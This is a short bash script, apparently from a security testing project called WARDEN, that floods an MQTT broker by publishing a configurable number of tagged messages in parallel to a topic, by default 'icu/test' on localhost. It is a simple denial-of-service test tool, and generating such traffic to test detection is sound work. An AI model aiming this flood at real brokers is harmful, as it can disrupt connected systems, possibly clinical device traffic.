#!/usr/bin/env bash
set -euo pipefail

HOST="${1:-localhost}"
TOPIC="${2:-icu/test}"
COUNT="${3:-100}"
MESSAGE="${4:-WARDEN_MQTT_ATTACK}"

echo "[WARDEN] MQTT flood"
echo "Host: $HOST"
echo "Topic: $TOPIC"
echo "Count: $COUNT"

if ! command -v mosquitto_pub >/dev/null 2>&1; then
  echo "Error: mosquitto_pub not found."
  echo "Install with: sudo apt install mosquitto-clients"
  exit 1
fi

for i in $(seq 1 "$COUNT"); do
  mosquitto_pub -h "$HOST" -t "$TOPIC" -m "$MESSAGE-$i" &
done

wait
echo "[WARDEN] MQTT flood complete."
